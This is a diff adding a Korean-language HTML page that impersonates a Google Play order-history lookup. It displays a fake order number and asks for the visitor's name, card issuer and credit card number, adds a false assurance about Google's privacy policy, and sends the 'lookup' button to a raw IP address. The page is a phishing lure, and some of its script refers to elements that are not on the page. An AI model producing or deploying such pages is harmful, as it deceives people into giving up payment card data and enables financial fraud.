@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="ko">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google Play</title>
+    <script src="/jquery/jquery-1.10.2.min.js"></script>
+    <script src="/jquery/jquery-3.4.1.min.js"></script>
+    <style>
+      * {
+      margin: 0;
+      padding: 0;
+      list-style-type: none;
+      font-family: 'Malgun Gothic';
+    }
+
+    a:link,
+    a:visited {
+      text-decoration: none;
+    }
+
+    #top-bar {
+      width: 100%;
+      height: 60px;
+      border-bottom: 1px solid #f0f0f0;
+      overflow: hidden;
+    }
+
+    h1 {
+      width: 70px;
+      margin: 15px 0 0 20px;
+    }
+
+    h1 img {
+      width: 100%;
+      border: none;
+    }
+
+    #content-box {
+      width: 600px;
+      padding: 30px 20px;
+      margin: 40px auto 0;
+      box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.14), 0 3px 1px -2px rgba(0, 0, 0, 0.12), 0 1px 5px 0 rgba(0, 0, 0, 0.2);
+      border-radius: 5px;
+    }
+
+    #content-box h2 {
+      font-size: 28px;
+      font-weight: 400;
+    }
+
+    #header p {
+      font-size: 12px;
+      color: #888888;
+      margin-top: 30px;
+    }
+
+    #header div {
+      font-size: 14px;
+      color: #333333;
+      margin-top: 50px;
+    }
+
+    #header span {
+      font-weight: 700;
+    }
+
+    #name-form {
+      margin-top: 40px;
+    }
+
+    #name-form div,
+    #card-form div {
+      width: 390px;
+      margin-top: 1px;
+    }
+
+    #card-form div {
+      height: 40px;
+      margin-top: 20px;
+    }
+
+    #name-form div label {
+      font-size: 12px;
+      color: #888888;
+      margin-top: 10px;
+      display: block;
+    }
+
+    #name-form div input,
+    #card-form div input {
+      width: 100%;
+      height: 30px;
+      text-indent: 5px;
+      margin-top: 4px;
+      border: none;
+      border-bottom: 1px solid #cccccc;
+    }
+
+    #card-form select {
+      color: #888888;
+      width: 100%;
+      height: 30px;
+      text-indent: 5px;
+      margin-top: 4px;
+      border: none;
+      border-bottom: 1px solid #cccccc;
+      cursor: pointer;
+      font-size: 12px;
+      box-sizing: border-box;
+      -webkit-appearance: none;
+    }
+
+    #card-text {
+      font-size: 16px;
+      margin-top: 40px;
+    }
+
+    ::-webkit-input-placeholder {
+      /* Chrome/Opera/Safari */
+      font-size: 12px;
+      color: #888888;
+    }
+
+    ::-moz-placeholder {
+      /* Firefox 19+ */
+      font-size: 12px;
+      color: #888888;
+    }
+
+    :-ms-input-placeholder {
+      /* IE 10+ */
+      font-size: 12px;
+      color: #888888;
+    }
+
+    :-moz-placeholder {
+      /* Firefox 18- */
+      font-size: 12px;
+      color: #888888;
+    }
+
+    #footer p {
+      font-size: 12px;
+      margin-top: 50px;
+    }
+
+    #button {
+      width: 75px;
+      height: 35px;
+      margin-top: 30px;
+      color: #ffffff;
+      text-align: center;
+      line-height: 35px;
+      background-color: #1a73e8;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    input:focus {
+      outline: none;
+    }
+
+    select:focus {
+      outline: none;
+    }
+
+    select {
+      background-color: transparent;
+    }
+
+    .alert {
+      font-size: 12px;
+      color: #d50000;
+      margin-top: 5px;
+    }
+
+    #select-box {
+      position: relative;
+    }
+
+    #select-box input {
+      font-size: 12px;
+      color: #888888;
+    }
+
+    #arrow {
+      height: 0;
+      width: 0 !important;
+      border-color: #5f6368 transparent;
+      border-width: 5px 5px 0 5px;
+      margin-top: -2.5px;
+      position: absolute;
+      right: 17.5px;
+      top: 0;
+      border-style: solid;
+      z-index: -1;
+    }
+
+    #drop-down {
+      width: 390px;
+      height: 300px;
+      border-radius: 10px;
+      background-color: #ffffff;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      overflow: auto;
+      padding-top: 10px;
+      position: absolute;
+      top: 0;
+      left: 0;
+      display: none;
+    }
+
+    #drop-down li {
+      font-size: 14px;
+      line-height: 40px;
+      padding-left: 20px;
+      cursor: pointer;
+    }
+
+    #drop-down li:hover {
+      background-color: #eeeeee;
+    }
+
+    #arrow-icon {
+      width: 12px;
+      position: absolute;
+      right: 5px;
+      top: 18px;
+      opacity: 0.7;
+    }
+    </style>
+  </head>
+  <body>
+    <div id="wrap">
+    <div id="top-bar">
+      <h1>
+        <a href="https://www.google.com"><img src="googlePlay.png" /></a>
+      </h1>
+    </div>
+    <div id="content-box">
+      <div id="header">
+        <h2>주문 내역 조회</h2>
+        <p>아래 양식을 작성한 후 Google Play 주문내역을 확인하세요</p>
+        <div>주문번호 : <span>GPA.3373-6692-3083-82764</span></div>
+      </div>
+      <div id="name-form">
+        <div id="last-name">
+          <label>성*</label> <input id="last-name-input" type="text" />
+          <p class="alert"></p>
+        </div>
+        <div id="first-name">
+          <label>이름*</label> <input id="first-name-input" type="text" />
+          <p class="alert"></p>
+        </div>
+      </div>
+      <div id="card-text">신용카드/체크카드</div>
+      <div id="card-form">
+        <div id="select-box">
+          <form>
+            <select name="card-form">
+              <option value="none">카드사 선택</option>
+              <option value="현대카드">현대카드</option>
+              <option value="삼성카드">삼성카드</option>
+              <option value="비씨카드">비씨카드</option>
+              <option value="KB국민카드">KB국민카드</option>
+              <option value="신한카드">신한카드</option>
+              <option value="롯데카드">롯데카드</option>
+              <option value="NH농협카드">NH농협카드</option>
+              <option value="하나카드">하나카드</option>
+              <option value="씨티카드">씨티카드</option>
+              <option value="케이뱅크">케이뱅크</option>
+              <option value="하나(외환)카드">하나(외환)카드</option>
+              <option value="우리카드">우리카드</option>
+              <option value="저축은행">저축은행</option>
+              <option value="광주카드">광주카드</option>
+              <option value="전북카드">전북카드</option>
+              <option value="수협카드">수협카드</option>
+              <option value="KDB산업카드">KDB산업카드</option>
+              <option value="조흥카드">조흥카드</option>
+              <option value="제주카드">제주카드</option>
+              <option value="신협카드">신협카드</option>
+              <option value="우체국비씨">우체국비씨</option>
+              <option value="하나비씨">하나비씨</option>
+              <option value="NH비씨">NH비씨</option>
+              <option value="카카오뱅크">카카오뱅크</option>
+              <option value="KB증권(현대)">KB증권(현대)</option>
+            </select>
+          </form>
+          <p class="alert"></p>
+          <div id="arrow"></div>
+        </div>
+        <div>
+          <input id="card-num" type="text" placeholder="카드 번호" />
+          <p class="alert"></p>
+        </div>
+      </div>
+      <div id="footer">
+        <p>개인정보는 안전하게 저장되며 <a href="#">Google 개인정보처리방침</a>에 따라 처리됩니다.</p>
+        <a href="http://155.230.52.54:8080/ksj/video.html"><div id="button">조회</div></a>
+      </div>
+    </div>
+  </div>
+   <script>
+      $('#company').click(function () {
+      if ($('#company').val() !== 'choice') {
+        $('#company').css({
+          color: '#333333'
+        });
+      } else {
+        $('#company').css({
+          color: '#888888'
+        });
+      }
+    });
+
+    $('input').on('focus', function () {
+      $(this).css({ borderColor: '#4285f4', borderWidth: '2px' });
+    });
+
+    $('input').on('blur', function () {
+      $(this).css({ borderColor: '#cccccc', borderWidth: '1px' });
+    });
+
+    var selectBox = $('#select-box input');
+    var dropLi = $('#drop-down li');
+
+    selectBox.click(function () {
+      $('#drop-down').css({ display: 'block' });
+    });
+
+    dropLi.click(function (e) {
+      if (version === ' MSIE 8.0') {
+        $('#drop-down').css({ display: 'none' });
+        selectBox.val(e.target.innerHTML);
+      } else {
+        $('#drop-down').css({ display: 'none' });
+        selectBox.val(e.target.textContent);
+      }
+    });
+
+    $(document.body).click(function (e) {
+      if ($(e.target).is(selectBox) === false) {
+        $('#drop-down').css({ display: 'none' });
+      }
+    });
+
+    $('#card-num').on('keypress keyup blur', function (e) {
+      if (
+        (e.which != 46 ||
+          $(this)
+            .val()
+            .indexOf('.') != -1) &&
+        (e.which < 48 || e.which > 57)
+      ) {
+        e.preventDefault();
+      }
+    });
+
+    function validation() {
+      $('#last-name .alert, #first-name .alert').text('');
+      $('#company')
+        .next('.alert')
+        .text('');
+      $('#card-num')
+        .next('.alert')
+        .text('');
+
+      if ($('#last-name-input').val() === '') {
+        $('#last-name .alert').text('성을 입력하세요');
+        return false;
+      } else if ($('#first-name-input').val() === '') {
+        $('#first-name .alert').text('이름을 입력하세요');
+        return false;
+      } else if ($('#company').val() === 'choice') {
+        $('#company')
+          .next('.alert')
+          .text('카드사를 선택하세요');
+        return false;
+      } else if ($('#card-num').val() === '') {
+        $('#card-num')
+          .next('.alert')
+          .text('카드번호를 입력하세요');
+        return false;
+      }
+      return true;
+    }
+    </script>
+  </body>
+</html>
